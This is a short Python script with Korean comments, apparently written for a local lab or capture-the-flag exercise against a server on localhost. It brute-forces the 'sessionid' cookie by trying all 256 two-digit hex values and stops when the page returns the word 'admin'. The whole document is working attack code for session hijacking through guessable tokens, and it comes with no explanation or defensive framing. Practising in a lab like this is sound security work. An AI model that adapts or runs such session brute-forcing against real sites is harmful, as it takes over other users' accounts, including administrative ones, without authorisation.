import requests

url = "http://127.0.0.1:8000/"  # 대상 URL

session = requests.Session()

for i in range(256):
    hex_val = f"{i:02x}"
    cookies = {'sessionid': hex_val}
    
    try:
        response = session.get(url, cookies=cookies)
        
        # 성공 조건 (응답에 실패 문구가 포함되지 않았거나 특정 문구가 있는 경우)
        if "admin" in response.text:
            print(f"Success! sessionid: {hex_val}")
            break
    except Exception as e:
        pass